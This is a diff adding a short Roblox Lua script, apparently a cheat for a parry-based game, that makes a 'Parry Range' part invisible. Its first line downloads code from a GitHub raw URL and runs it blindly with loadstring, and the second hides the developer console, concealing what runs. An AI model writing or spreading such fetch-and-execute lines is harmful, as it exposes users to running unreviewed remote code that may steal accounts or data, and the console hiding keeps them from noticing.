@@ -1,0 +1,15 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/JoeBidenhub/AutoParryV2/main/AntiCurve"))()
+
+game:GetService'StarterGui':SetCore("DevConsoleVisible", false)
+
+-- Get the Parry Range part
+local parryRange = workspace:WaitForChild("Parry Range")
+
+-- Check if the part exists
+if parryRange then
+    -- Set transparency to 1 (completely transparent)
+    parryRange.Transparency = 1
+    print("Parry Range transparency set to 1.")
+else
+    warn("Parry Range part not found.")
+end
